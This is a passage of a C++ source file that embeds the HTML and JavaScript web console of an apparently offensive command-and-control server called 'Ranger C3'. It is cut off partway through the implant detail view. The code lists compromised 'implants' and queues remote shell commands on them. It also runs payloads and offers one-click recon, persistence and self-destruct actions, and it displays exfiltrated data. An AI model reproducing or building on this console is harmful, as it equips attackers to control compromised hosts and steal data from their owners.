#include <string>

namespace snake::api {

const char* kDashboardHTML = R"SNAKEDASH(<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ranger C3 v3</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: #0a0a0a; color: #c0c0c0; font-family: 'Courier New', 'Consolas', monospace; overflow: hidden; height: 100vh; }

.app-layout { display: flex; height: 100vh; }
.sidebar { width: 200px; background: #0d0d0d; border-right: 1px solid #1a3a1a; display: flex; flex-direction: column; flex-shrink: 0; }
.sidebar-header { padding: 18px 16px 12px; border-bottom: 1px solid #1a3a1a; }
.sidebar-header h1 { color: #00ff41; font-size: 14px; font-weight: normal; letter-spacing: 3px; text-transform: uppercase; }
.sidebar-header .c2id { color: #444; font-size: 9px; margin-top: 4px; word-break: break-all; }
.sidebar-nav { flex: 1; padding: 8px 0; }
.nav-item { padding: 10px 16px; cursor: pointer; font-size: 11px; color: #666; letter-spacing: 1px; border-left: 2px solid transparent; transition: all 0.15s; text-transform: uppercase; display: flex; align-items: center; gap: 8px; }
.nav-item:hover { color: #00ff41; background: #111; }
.nav-item.active { color: #00ff41; border-left-color: #00ff41; background: #0d1a0d; }
.nav-item .nav-badge { margin-left: auto; background: #1a3a1a; color: #00ff41; font-size: 9px; padding: 1px 6px; border-radius: 0; }
.sidebar-footer { padding: 12px 16px; border-top: 1px solid #1a3a1a; }
.sidebar-footer button { background: transparent; border: 1px solid #333; color: #555; padding: 6px 12px; cursor: pointer; font-family: 'Courier New', monospace; font-size: 10px; width: 100%; letter-spacing: 1px; }
.sidebar-footer button:hover { border-color: #00ff41; color: #00ff41; }

.main-area { flex: 1; overflow-y: auto; padding: 0; display: flex; flex-direction: column; }

.top-bar { background: #0d0d0d; border-bottom: 1px solid #1a3a1a; padding: 10px 20px; display: flex; gap: 24px; font-size: 10px; align-items: center; flex-wrap: wrap; }
.top-bar-item { color: #555; }
.top-bar-item .tbv { color: #00ff41; margin-left: 4px; }
.top-bar-right { margin-left: auto; display: flex; gap: 16px; align-items: center; }
.conn-status { display: inline-block; width: 6px; height: 6px; border-radius: 0; }
.conn-status.online { background: #00ff41; }
.conn-status.offline { background: #444; }
.clock { color: #444; font-size: 10px; }

.content { padding: 20px; flex: 1; }

.login-screen { max-width: 380px; margin: 120px auto; text-align: center; }
.login-screen .login-logo { color: #00ff41; font-size: 20px; letter-spacing: 5px; margin-bottom: 8px; text-transform: uppercase; }
.login-screen .login-sub { color: #444; font-size: 10px; margin-bottom: 28px; letter-spacing: 2px; }
.login-screen input[type=password] { background: #111; border: 1px solid #1a3a1a; color: #c0c0c0; padding: 12px; width: 100%; margin-bottom: 12px; font-family: 'Courier New', monospace; font-size: 13px; outline: none; text-align: center; }
.login-screen input[type=password]:focus { border-color: #00ff41; }
.login-screen button { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 10px 40px; cursor: pointer; font-family: 'Courier New', monospace; font-size: 12px; letter-spacing: 2px; }
.login-screen button:hover { background: #00ff41; color: #000; }
.login-screen .login-error { color: #ff4444; margin-top: 14px; font-size: 11px; }
.login-screen .login-spinner { margin-top: 14px; color: #555; font-size: 11px; }

.section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
.section-header h2 { color: #00ff41; font-size: 13px; font-weight: normal; letter-spacing: 2px; text-transform: uppercase; }
.section-header .section-actions { display: flex; gap: 8px; align-items: center; }

.search-box { background: #111; border: 1px solid #1a3a1a; color: #c0c0c0; padding: 7px 10px; font-family: 'Courier New', monospace; font-size: 11px; width: 220px; outline: none; }
.search-box:focus { border-color: #00ff41; }
.filter-select { background: #111; border: 1px solid #1a3a1a; color: #aaa; padding: 7px 10px; font-family: 'Courier New', monospace; font-size: 11px; outline: none; cursor: pointer; }
.filter-select:focus { border-color: #00ff41; }

.table-wrap { overflow-x: auto; }
table { width: 100%; border-collapse: collapse; }
th, td { border: 1px solid #1a3a1a; padding: 8px 10px; text-align: left; font-size: 11px; }
th { background: #111; color: #00ff41; letter-spacing: 1px; font-weight: normal; white-space: nowrap; }
td { color: #aaa; }
tr { transition: background 0.1s; }
tr:hover td { background: #121212; }
tr.clickable { cursor: pointer; }
tr.clickable:hover td { background: #0d1a0d; }
.empty-row td { text-align: center; color: #444; padding: 30px; font-size: 11px; letter-spacing: 1px; }

.badge { display: inline-block; padding: 1px 6px; font-size: 9px; letter-spacing: 1px; }
.badge-green { color: #00ff41; border: 1px solid #1a3a1a; }
.badge-red { color: #ff4444; border: 1px solid #3a1a1a; }
.badge-yellow { color: #ffaa00; border: 1px solid #3a2a00; }
.badge-gray { color: #555; border: 1px solid #222; }
.badge-blue { color: #44aaff; border: 1px solid #1a2a3a; }

.btn { background: transparent; border: 1px solid #1a3a1a; color: #00ff41; padding: 6px 14px; cursor: pointer; font-family: 'Courier New', monospace; font-size: 10px; letter-spacing: 1px; transition: all 0.1s; white-space: nowrap; }
.btn:hover { background: #00ff41; color: #000; border-color: #00ff41; }
.btn-sm { padding: 4px 10px; font-size: 9px; }
.btn-danger { border-color: #3a1a1a; color: #ff4444; }
.btn-danger:hover { background: #ff4444; color: #000; border-color: #ff4444; }
.btn-ghost { border-color: transparent; color: #555; }
.btn-ghost:hover { border-color: #333; color: #aaa; }
.btn:disabled { opacity: 0.3; cursor: not-allowed; }
.btn-group { display: flex; gap: 6px; flex-wrap: wrap; }

.stats-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin-bottom: 20px; }
.stat-card { background: #111; border: 1px solid #1a3a1a; padding: 12px 14px; }
.stat-card .stat-label { color: #555; font-size: 9px; text-transform: uppercase; letter-spacing: 1px; }
.stat-card .stat-value { color: #00ff41; font-size: 18px; margin-top: 3px; }
.stat-card .stat-sub { color: #444; font-size: 9px; margin-top: 2px; }

.card { background: #111; border: 1px solid #1a3a1a; margin-bottom: 16px; }
.card-header { padding: 10px 14px; border-bottom: 1px solid #1a3a1a; display: flex; justify-content: space-between; align-items: center; }
.card-header h3 { color: #00ff41; font-size: 11px; font-weight: normal; letter-spacing: 1px; text-transform: uppercase; }
.card-body { padding: 14px; }

.shell-output { background: #080808; border: 1px solid #1a3a1a; padding: 12px; overflow-x: auto; max-height: 300px; overflow-y: auto; font-size: 11px; line-height: 1.6; margin-bottom: 10px; }
.shell-output .shell-line { color: #aaa; white-space: pre-wrap; word-break: break-all; }
.shell-output .shell-line.input { color: #00ff41; }
.shell-output .shell-line.output { color: #c0c0c0; }
.shell-output .shell-line.error { color: #ff4444; }
.shell-output .shell-prompt { color: #00ff41; }
.shell-input-row { display: flex; gap: 8px; }
.shell-input-row input { flex: 1; background: #111; border: 1px solid #1a3a1a; color: #00ff41; padding: 8px 10px; font-family: 'Courier New', monospace; font-size: 12px; outline: none; }
.shell-input-row input:focus { border-color: #00ff41; }
.shell-input-row input::placeholder { color: #333; }

.detail-tabs { display: flex; gap: 0; margin-bottom: 16px; border-bottom: 1px solid #1a3a1a; }
.detail-tab { padding: 8px 18px; cursor: pointer; font-family: 'Courier New', monospace; font-size: 11px; color: #555; border-bottom: 1px solid transparent; margin-bottom: -1px; letter-spacing: 1px; }
.detail-tab:hover { color: #aaa; }
.detail-tab.active { color: #00ff41; border-bottom-color: #00ff41; }
.detail-panel { display: none; }
.detail-panel.active { display: block; }

.payload-form { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
.payload-form select { background: #111; border: 1px solid #1a3a1a; color: #aaa; padding: 7px 10px; font-family: 'Courier New', monospace; font-size: 11px; outline: none; min-width: 160px; }
.payload-form select:focus { border-color: #00ff41; }
.payload-form input[type=text] { background: #111; border: 1px solid #1a3a1a; color: #c0c0c0; padding: 7px 10px; font-family: 'Courier New', monospace; font-size: 11px; outline: none; min-width: 180px; }
.payload-form input[type=text]:focus { border-color: #00ff41; }

.kv-list { display: grid; grid-template-columns: auto 1fr; gap: 6px 16px; font-size: 11px; }
.kv-list .kv-key { color: #555; letter-spacing: 1px; white-space: nowrap; }
.kv-list .kv-val { color: #aaa; word-break: break-all; }
.kv-list .kv-val.green { color: #00ff41; }

.back-link { color: #555; font-size: 11px; cursor: pointer; display: inline-block; margin-bottom: 14px; letter-spacing: 1px; }
.back-link:hover { color: #00ff41; }

.loading { text-align: center; padding: 40px; color: #444; font-size: 11px; letter-spacing: 2px; }
.loading-dots::after { content: ' ...'; }
@keyframes blink { 50% { opacity: 0; } }
.loading-dots { animation: blink 1.5s step-end infinite; }

.modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); display: flex; align-items: center; justify-content: center; z-index: 1000; }
.modal { background: #0d0d0d; border: 1px solid #1a3a1a; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto; }
.modal-header { padding: 12px 16px; border-bottom: 1px solid #1a3a1a; display: flex; justify-content: space-between; align-items: center; }
.modal-header h3 { color: #00ff41; font-size: 12px; font-weight: normal; letter-spacing: 2px; }
.modal-close { background: none; border: none; color: #555; cursor: pointer; font-size: 16px; font-family: 'Courier New', monospace; }
.modal-close:hover { color: #ff4444; }
.modal-body { padding: 16px; }
.modal-body label { display: block; color: #666; font-size: 10px; letter-spacing: 1px; margin-bottom: 4px; margin-top: 12px; }
.modal-body label:first-child { margin-top: 0; }
.modal-body input, .modal-body textarea, .modal-body select { background: #111; border: 1px solid #1a3a1a; color: #c0c0c0; padding: 8px; width: 100%; font-family: 'Courier New', monospace; font-size: 11px; outline: none; }
.modal-body input:focus, .modal-body textarea:focus, .modal-body select:focus { border-color: #00ff41; }
.modal-body textarea { min-height: 80px; resize: vertical; }
.modal-footer { padding: 12px 16px; border-top: 1px solid #1a3a1a; display: flex; justify-content: flex-end; gap: 8px; }

.task-log { max-height: 500px; overflow-y: auto; }
.task-entry { padding: 6px 0; border-bottom: 1px solid #111; font-size: 10px; display: flex; gap: 10px; }
.task-entry:last-child { border-bottom: none; }
.task-entry .task-time { color: #444; white-space: nowrap; }
.task-entry .task-type { color: #44aaff; }
.task-entry .task-id { color: #333; }
.task-entry .task-status { margin-left: auto; }
.status-pending { color: #ffaa00; }
.status-delivered { color: #44aaff; }
.status-completed { color: #00ff41; }
.status-failed { color: #ff4444; }

.toast { position: fixed; bottom: 20px; right: 20px; background: #111; border: 1px solid #1a3a1a; padding: 10px 16px; font-size: 11px; color: #c0c0c0; z-index: 2000; max-width: 360px; transition: opacity 0.3s; }
.toast.success { border-left: 2px solid #00ff41; }
.toast.error { border-left: 2px solid #ff4444; }

.exfil-item { padding: 8px 12px; border: 1px solid #1a3a1a; margin-bottom: 6px; font-size: 10px; display: flex; justify-content: space-between; align-items: center; }
.exfil-item .exfil-meta { color: #555; }
.exfil-item .exfil-meta span { margin-right: 12px; }

::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-track { background: #0a0a0a; }
::-webkit-scrollbar-thumb { background: #1a3a1a; }
::-webkit-scrollbar-thumb:hover { background: #2a4a2a; }
</style>
</head>
<body>
<div id="app"></div>
<script>
(function() {
var API = '';
var token = localStorage.getItem('token');
var currentView = 'implants';
var selectedImplantId = null;
var implantsCache = [];
var peersCache = [];
var payloadsCache = [];
var configCache = {};
var refreshTimer = null;
var shellHistory = {};
var toastTimer = null;

function headers() {
  return {
    'Authorization': 'Bearer ' + token,
    'Content-Type': 'application/json'
  };
}

function api(path) {
  return fetch(API + path, {headers: headers()}).then(function(r) { return r.json(); });
}

function apiRaw(path) {
  return fetch(API + path, {headers: headers()}).then(function(r) { return r.text(); });
}

function post(path, body) {
  return fetch(API + path, {
    method: 'POST',
    headers: headers(),
    body: JSON.stringify(body || {})
  }).then(function(r) { return r.json(); });
}

function toast(msg, type) {
  type = type || 'success';
  var el = document.getElementById('toast');
  if (!el) {
    el = document.createElement('div');
    el.id = 'toast';
    el.className = 'toast';
    document.body.appendChild(el);
  }
  el.className = 'toast ' + type;
  el.textContent = msg;
  el.style.opacity = '1';
  if (toastTimer) clearTimeout(toastTimer);
  toastTimer = setTimeout(function() { el.style.opacity = '0'; }, 4000);
}

function login() {
  var pw = document.getElementById('login-pw').value;
  fetch(API + '/api/dashboard/login', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({password: pw})
  }).then(function(r) { return r.json(); }).then(function(data) {
    if (data.token) {
      token = data.token;
      localStorage.setItem('token', token);
      render();
    } else {
      document.getElementById('login-error').textContent = 'invalid credentials';
    }
  }).catch(function() {
    document.getElementById('login-error').textContent = 'connection error';
  });
}

function logout() {
  token = null;
  localStorage.removeItem('token');
  selectedImplantId = null;
  render();
}

function navigate(view) {
  currentView = view;
  selectedImplantId = null;
  render();
}

function showImplantDetail(id) {
  selectedImplantId = id;
  currentView = 'implant-detail';
  render();
}

function backToImplants() {
  selectedImplantId = null;
  currentView = 'implants';
  render();
}

function ago(ts) {
  if (!ts) return 'never';
  var d = new Date(ts);
  var diff = (Date.now() - d.getTime()) / 1000;
  if (diff < 60) return Math.round(diff) + 's ago';
  if (diff < 3600) return Math.round(diff/60) + 'm ago';
  if (diff < 86400) return Math.round(diff/3600) + 'h ago';
  return Math.round(diff/86400) + 'd ago';
}

function fmtTime(ts) {
  if (!ts) return '-';
  var d = new Date(ts);
  return d.toLocaleString();
}

function fmtTimeShort(ts) {
  if (!ts) return '-';
  var d = new Date(ts);
  return d.toLocaleTimeString();
}

function pad(n) { return n < 10 ? '0' + n : '' + n; }

function updateClock() {
  var el = document.getElementById('clock');
  if (el) {
    var d = new Date();
    el.textContent = d.getUTCFullYear() + '-' + pad(d.getUTCMonth()+1) + '-' + pad(d.getUTCDate()) + 'T' + pad(d.getUTCHours()) + ':' + pad(d.getUTCMinutes()) + ':' + pad(d.getUTCSeconds()) + 'Z';
  }
}

function sendShellCommand(implantId) {
  var input = document.getElementById('shell-input');
  var cmd = input ? input.value.trim() : '';
  if (!cmd) return;

  var output = document.getElementById('shell-output');
  if (output) {
    output.innerHTML = output.innerHTML + '<div class="shell-line input"><span class="shell-prompt">$ </span>' + escHtml(cmd) + '</div>';
    output.innerHTML = output.innerHTML + '<div class="shell-line output">[task queued, waiting for implant check-in...]</div>';
    output.scrollTop = output.scrollHeight;
  }
  input.value = '';

  post('/api/dashboard/task', {
    implant_id: implantId,
    type: 'shell',
    payload: {command: cmd},
    channel: 'primary'
  }).then(function(data) {
    if (data.success) {
      toast('shell task queued: ' + data.task_id);
    } else {
      toast('error queuing shell task', 'error');
    }
  }).catch(function() {
    toast('connection error', 'error');
  });
}

function sendCustomTask(implantId) {
  var taskType = document.getElementById('custom-task-type').value;
  var taskPayload = document.getElementById('custom-task-payload').value;
  if (!taskType) { toast('enter a task type', 'error'); return; }

  var payload = {};
  try {
    payload = taskPayload ? JSON.parse(taskPayload) : {};
  } catch(e) {
    toast('invalid JSON payload', 'error');
    return;
  }

  post('/api/dashboard/task', {
    implant_id: implantId,
    type: taskType,
    payload: payload,
    channel: 'primary'
  }).then(function(data) {
    if (data.success) {
      toast('custom task queued: ' + data.task_id);
    } else {
      toast('error queuing task', 'error');
    }
  }).catch(function() {
    toast('connection error', 'error');
  });
}

function runPayload(implantId, payloadName, payloadArgs) {
  var args = payloadArgs || '';
  var parsedArgs = {};
  if (args) {
    try { parsedArgs = JSON.parse(args); } catch(e) { parsedArgs = {args: args}; }
  }

  post('/api/dashboard/task', {
    implant_id: implantId,
    type: 'exec',
    payload: {payload: payloadName, args: parsedArgs},
    channel: 'primary'
  }).then(function(data) {
    if (data.success) {
      toast('payload task queued: ' + data.task_id);
    } else {
      toast('error', 'error');
    }
  }).catch(function() {
    toast('connection error', 'error');
  });
}

function quickAction(implantId, action) {
  var payloads = {
    'recon': {command: 'whoami && hostname && ip addr'},
    'screenshot': {command: 'screenshot'},
    'sleep30': {command: 'sleep 30'},
    'persist': {command: 'persist'},
    'selfdestruct': {command: 'selfdestruct'}
  };
  var p = payloads[action] || {command: action};

  post('/api/dashboard/task', {
    implant_id: implantId,
    type: 'shell',
    payload: p,
    channel: 'primary'
  }).then(function(data) {
    if (data.success) {
      toast('action queued: ' + action);
    } else {
      toast('error', 'error');
    }
  }).catch(function() {
    toast('connection error', 'error');
  });
}

function showExfilModal(implantId) {
  var overlay = document.createElement('div');
  overlay.className = 'modal-overlay';
  overlay.innerHTML = '<div class="modal"><div class="modal-header"><h3>Exfil Data : ' + escHtml(implantId.substring(0,12)) + '</h3><button class="modal-close" onclick="this.parentElement.parentElement.parentElement.remove()">x</button></div><div class="modal-body"><div class="loading">fetching...</div></div></div>';
  document.body.appendChild(overlay);
  overlay.addEventListener('click', function(e) { if (e.target === overlay) overlay.remove(); });

  api('/api/dashboard/exfil/' + implantId).then(function(data) {
    var body = overlay.querySelector('.modal-body');
    if (!data.success) {
      body.innerHTML = '<p style="color:#444">no exfil data available</p>';
      return;
    }
    body.innerHTML = '<p style="color:#555;font-size:11px">implant: ' + escHtml(data.implant || implantId) + '</p><p style="color:#555;font-size:11px">' + escHtml(data.message || 'exfil endpoint active') + '</p><div style="margin-top:12px"><pre style="background:#080808;border:1px solid #1a3a1a;padding:10px;font-size:10px;overflow-x:auto">' + escHtml(JSON.stringify(data, null, 2)) + '</pre></div>';
  }).catch(function() {
    var body = overlay.querySelector('.modal-body');
    body.innerHTML = '<p style="color:#ff4444">failed to fetch exfil data</p>';
  });
}

function escHtml(s) {
  if (s == null) return '';
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function isOnline(lastSeen, thresholdMs) {
  if (!lastSeen) return false;
  thresholdMs = thresholdMs || 300000;
  return (Date.now() - new Date(lastSeen).getTime()) < thresholdMs;
}

function statusBadge(online) {
  if (online) return '<span class="badge badge-green">ONLINE</span>';
  return '<span class="badge badge-gray">OFFLINE</span>';
}

function flaggedBadge() {
  return '<span class="badge badge-red">FLAGGED</span>';
}

function render() {
  var app = document.getElementById('app');
  updateClock();

  if (!token) {
    renderLogin(app);
    return;
  }

  Promise.all([
    api('/api/dashboard/config'),
    api('/api/dashboard/implants'),
    api('/api/dashboard/peers'),
    api('/api/dashboard/payloads')
  ]).then(function(results) {
    configCache = results[0].config || {};
    implantsCache = results[1].implants || [];
    peersCache = results[2].peers || [];
    payloadsCache = results[3].payloads || [];
    renderMain(app);
  }).catch(function() {
    app.innerHTML = '<div class="login-screen"><div class="login-logo">connection lost</div><p style="color:#555;font-size:11px;margin:12px 0 20px">retrying automatically...</p><button onclick="render()">retry</button></div>';
  });

  if (refreshTimer) clearTimeout(refreshTimer);
  refreshTimer = setTimeout(render, 12000);

  if (!app.innerHTML) {
    app.innerHTML = '<div style="display:flex;height:100vh;align-items:center;justify-content:center"><span style="color:#333;letter-spacing:2px;font-size:12px">RANGER C3 <span class="loading-dots">loading</span></span></div>';
  }
}

function renderLogin(app) {
  app.innerHTML = '<div class="login-screen">' +
    '<div class="login-logo">RANGER C3</div>' +
    '<div class="login-sub">v3.0.0 multi-node mesh c2</div>' +
    '<input type="password" id="login-pw" placeholder="access code" autofocus onkeydown="if(event.key==\'Enter\')login()">' +
    '<button onclick="login()">authenticate</button>' +
    '<div class="login-error" id="login-error"></div>' +
    '</div>';
}

function renderMain(app) {
  var onlineCount = 0, dnsCount = 0, flaggedCount = 0;
  for (var i = 0; i < implantsCache.length; i++) {
    var im = implantsCache[i];
    if (isOnline(im.last_seen)) onlineCount++;
    if (im.dns_enabled) dnsCount++;
    if (im.flagged) flaggedCount++;
  }

  var cfg = configCache;
  var contentHTML = '';
  var implantTitle = 'Implants (' + implantsCache.length + ')';

  if (currentView === 'implant-detail' && selectedImplantId) {
    contentHTML = renderImplantDetail(selectedImplantId);
    implantTitle = 'Implant Detail';
  } else if (currentView === 'implants') {
    contentHTML = renderImplantList();
  } else if (currentView === 'peers') {
    contentHTML = renderPeers();
  } else if (currentView === 'payloads') {
    contentHTML = renderPayloads();
  } else {
    contentHTML = renderImplantList();
    currentView = 'implants';
  }

  var navImplantsActive = (currentView === 'implants' || currentView === 'implant-detail') ? 'active' : '';
  var navPeersActive = (currentView === 'peers') ? 'active' : '';
  var navPayloadsActive = (currentView === 'payloads') ? 'active' : '';

  app.innerHTML =
    '<div class="app-layout">' +
    '  <div class="sidebar">' +
    '    <div class="sidebar-header">' +
    '      <h1>RANGER C3</h1>' +
    '      <div class="c2id">' + escHtml(cfg.c2_id || 'standalone') + '</div>' +
    '    </div>' +
    '    <div class="sidebar-nav">' +
    '      <div class="nav-item ' + navImplantsActive + '" onclick="navigate(\'implants\')">implants<div class="nav-badge">' + implantsCache.length + '</div></div>' +
    '      <div class="nav-item ' + navPeersActive + '" onclick="navigate(\'peers\')">mesh peers<div class="nav-badge">' + peersCache.length + '</div></div>' +
    '      <div class="nav-item ' + navPayloadsActive + '" onclick="navigate(\'payloads\')">payloads<div class="nav-badge">' + (payloadsCache.length||0) + '</div></div>' +
    '    </div>' +
    '    <div class="sidebar-footer">' +
    '      <button onclick="logout()">disconnect</button>' +
    '    </div>' +
    '  </div>' +
    '  <div class="main-area">' +
    '    <div class="top-bar">' +
    '      <div class="top-bar-item">version: <span class="tbv">' + escHtml(cfg.version || '?') + '</span></div>' +
    '      <div class="top-bar-item">uptime: <span class="tbv">' + escHtml(cfg.uptime || '?') + '</span></div>' +
    '      <div class="top-bar-item">implants: <span class="tbv">' + implantsCache.length + '</span></div>' +
    '      <div class="top-bar-item">online: <span class="tbv">' + onlineCount + '</span></div>' +
    '      <div class="top-bar-item"><span class="conn-status ' + (implantsCache.length > 0 ? 'online' : 'offline') + '"></span></div>' +
    '      <div class="top-bar-right">' +
    '        <span class="clock" id="clock"></span>' +
    '      </div>' +
    '    </div>' +
    '    <div class="content">' +
    '      <div class="section-header">' +
    '        <h2>' + escHtml(implantTitle) + '</h2>' +
    '      </div>' +
    contentHTML +
    '    </div>' +
    '  </div>' +
    '</div>';
}

function renderImplantList() {
  var search = '';
  var filter = '';
  if (window._impSearch) search = window._impSearch;
  if (window._impFilter) filter = window._impFilter;

  var filtered = implantsCache;
  if (search) {
    var q = search.toLowerCase();
    filtered = filtered.filter(function(im) {
      return (im.id && im.id.toLowerCase().indexOf(q) >= 0) ||
             (im.hostname && im.hostname.toLowerCase().indexOf(q) >= 0) ||
             (im.type && im.type.toLowerCase().indexOf(q) >= 0) ||
             (im.target_proc && im.target_proc.toLowerCase().indexOf(q) >= 0);
    });
  }
  if (filter === 'online') {
    filtered = filtered.filter(function(im) { return isOnline(im.last_seen); });
  } else if (filter === 'offline') {
    filtered = filtered.filter(function(im) { return !isOnline(im.last_seen); });
  } else if (filter === 'flagged') {
    filtered = filtered.filter(function(im) { return im.flagged; });
  } else if (filter === 'dns') {
    filtered = filtered.filter(function(im) { return im.dns_enabled; });
  }

  var rows = '';
  if (filtered.length === 0) {
    rows = '<tr class="empty-row"><td colspan="9">no implants match</td></tr>';
  } else {
    for (var i = 0; i < filtered.length; i++) {
      var im = filtered[i];
      var online = isOnline(im.last_seen);
      var rowClass = '';
      if (im.flagged) rowClass = 'flagged';
      else if (im.dns_enabled && !online) rowClass = 'dns';

      var statusBadgeHtml = online ? '<span class="badge badge-green">ONLINE</span>' : '<span class="badge badge-gray">OFFLINE</span>';
      var jitterStr = (im.jitter_score != null) ? im.jitter_score.toFixed(2) : '1.00';
      var procStr = im.target_proc || 'unknown';
      var hostStr = im.hostname || '?';

      var actionsHtml = '<button class="btn btn-sm" onclick="event.stopPropagation();quickAction(\'' + im.id + '\',\'recon\')">recon</button>';

      rows = rows + '<tr class="clickable ' + rowClass + '" onclick="showImplantDetail(\'' + im.id + '\')">' +
        '<td>' + escHtml(im.id.substring(0,10)) + '</td>' +
        '<td>' + escHtml(im.type || '?') + '</td>' +
        '<td>' + escHtml(procStr) + '</td>' +
        '<td>' + escHtml(hostStr) + '</td>' +
        '<td>' + jitterStr + '</td>' +
        '<td>' + (im.dns_enabled ? 'Y' : 'N') + '</td>' +
        '<td>' + (im.mesh_enabled ? 'Y' : 'N') + '</td>' +
        '<td>' + statusBadgeHtml + '</td>' +
        '<td>' + ago(im.last_seen) + '</td>' +
        '</tr>';
    }
  }

  return '<div style="margin-bottom:14px;display:flex;gap:8px;align-items:center;flex-wrap:wrap">' +
    '<input class="search-box" type="text" placeholder="search implants..." value="' + escHtml(search) + '" oninput="window._impSearch=this.value;render()">' +
    '<select class="filter-select" onchange="window._impFilter=this.value;render()">' +
      '<option value="">all implants</option>' +
      '<option value="online"' + (filter==='online'?' selected':'') + '>online</option>' +
      '<option value="offline"' + (filter==='offline'?' selected':'') + '>offline</option>' +
      '<option value="flagged"' + (filter==='flagged'?' selected':'') + '>flagged</option>' +
      '<option value="dns"' + (filter==='dns'?' selected':'') + '>dns</option>' +
    '</select>' +
    '<span style="color:#444;font-size:10px;margin-left:auto">' + filtered.length + ' / ' + implantsCache.length + ' shown</span>' +
    '</div>' +
    '<div class="table-wrap"><table>' +
    '<tr><th>ID</th><th>Type</th><th>Process</th><th>Host</th><th>Jitter</th><th>DNS</th><th>Mesh</th><th>Status</th><th>Last Seen</th></tr>' +
    rows +
    '</table></div>';
}

function renderImplantDetail(id) {
  var im = null;
  for (var i = 0; i < implantsCache.length; i++) {
    if (implantsCache[i].id === id) { im = implantsCache[i]; break; }
  }

  if (!im) {
    return '<div class="back-link" onclick="backToImplants()">&lt; back to implants</div><div class="loading">implant not found</div>';
  }

  var online = isOnline(im.last_seen);
  var onlineStr = online ? 'ONLINE' : 'OFFLINE';
  var onlineClass = online ? 'badge-green' : 'badge-gray';
  var jitterStr = (im.jitter_score != null) ? im.jitter_score.toFixed(2) : '1.00';
  var firstSeen = im.first_seen ? fmtTime(im.first_seen) : '-';
  var lastSeen = im.last_seen ? fmtTime(im.last_seen) : '-';
  var lastSeenAgo = ago(im.last_seen);

  var taskSection = '<div class="loading" id="task-loading">loading tasks...</div>';

  return '<div class="back-link" onclick="backToImplants()">&lt; back to implants</div>' +

    '<div class="card" style="margin-bottom:16px">' +
    '<div class="card-header"><h3>' + escHtml(im.id.substring(0,16)) + '</h3>' +
    '<div>' + (im.flagged ? flaggedBadge() + ' ' : '') + '<span class="badge ' + onlineClass + '">' + onlineStr + '</span></div>' +
    '</div>' +
    '<div class="card-body">' +
    '<div class="stats-grid">' +
    '<div class="stat-card"><div class="stat-label">Type</div><div class="stat-value" style="font-size:14px">' + escHtml(im.type || '-') + '</div></div>' +
    '<div class="stat-card"><div class="stat-label">Hostname</div><div class="stat-value" style="font-size:14px">' + escHtml(im.hostname || '-') + '</div></div>' +
    '<div class="stat-card"><div class="stat-label">Process</div><div class="stat-value" style="font-size:14px">' + escHtml(im.target_proc || '-') + '</div></div>' +
    '<div class="stat-card"><div class="stat-label">Arch</div><div class="stat-value" style="font-size:14px">' + escHtml(im.arch || '-') + '</div></div>' +
    '<div class="stat-card"><div class="stat-label">Beacons</div><div class="stat-value">' + (im.beacon_count || 0) + '</div></div>' +
    '<div class="stat-card"><div class="stat-label">Tasks (sent/done)</div><div class="stat-value">' + (im.tasks_sent || 0) + ' / ' + (im.tasks_done || 0) + '</div></div>' +
    '<div class="stat-card"><div class="stat-label">Jitter Score</div><div class="stat-value">' + jitterStr + '</div></div>' +
    '<div class="stat-card"><div class="stat-label">Node ID</div><div class="stat-value" style="font-size:12px">' + escHtml(im.node_id || '-') + '</div></div>' +
    '<div class="stat-card"><div class="stat-label">First Seen</div><div class="stat-value" style="font-size:11px;color:#888">' + firstSeen + '</div></div>' +
    '<div class="stat-card"><div class="stat-label">Last Seen</div><div class="stat-value" style="font-size:11px;color:#888">' + lastSeen + '</div><div class="stat-sub">' + lastSeenAgo + '</div></div>' +
    '</div>' +
    '</div>' +
    '</div>' +

    '<div class="detail-tabs">' +
    '<div class="detail-tab active" onclick="switchDetailTab(this,\'shell\')" id="dtab-shell">shell</div>' +
    '<div class="detail-tab" onclick="switchDetailTab(this,\'tasks\')" id="dtab-tasks">tasks</div>' +
    '<div class="detail-tab" onclick="switchDetailTab(this,\'payload\')" id="dtab-payload">payload</div>' +
    '<div class="detail-tab" onclick="switchDetailTab(this,\'actions\')" id="dtab-actions">actions</div>' +
    '</div>' +

    '<div class="detail-panel active" id="panel-shell">' +
    '<div class="card">' +
    '<div class="card-header"><h3>Interactive Shell</h3></div>' +
    '<div class="card-body">' +
    '<div class="shell-output" id="shell-output"></div>' +
    '<div class="shell-input-row">' +
    '<input type="text" id="shell-input" placeholder="whoami, ls, ipconfig, ..." onkeydown="if(event.key==\'Enter\')sendShellCommand(\'' + id + '\')">' +
    '<button class="btn" onclick="sendShellCommand(\'' + id + '\')">send</button>' +
    '<button class="btn btn-sm" onclick="document.getElementById(\'shell-output\').innerHTML=\'\'">clear</button>' +
    '</div>' +
    '</div>' +
    '</div>' +
    '</div>' +

    '<div class="detail-panel" id="panel-tasks">' +
    '<div class="card">' +
    '<div class="card-header"><h3>Pending Tasks</h3><div><button class="btn btn-sm" onclick="refreshTaskList(\'' + id + '\')">refresh</button></div></div>' +
    '<div class="card-body">' +
    '<div id="tasks-container">' + taskSection + '</div>' +
    '</div>' +
    '</div>' +
    '<div class="card">' +
    '<div class="card-header"><h3>Custom Task</h3></div>' +
    '<div class="card-body">' +
    '<div style="display:flex;gap:8px;flex-wrap:wrap;align-items:end">' +
    '<div style="flex:1;min-width:120px"><label style="display:block;color:#555;font-size:9px;letter-spacing:1px;margin-bottom:3px">TYPE</label><input type="text" id="custom-task-type" value="shell" style="background:#111;border:1px solid #1a3a1a;color:#c0c0c0;padding:6px 8px;font-family:Courier New,monospace;font-size:11px;width:100%;outline:none"></div>' +
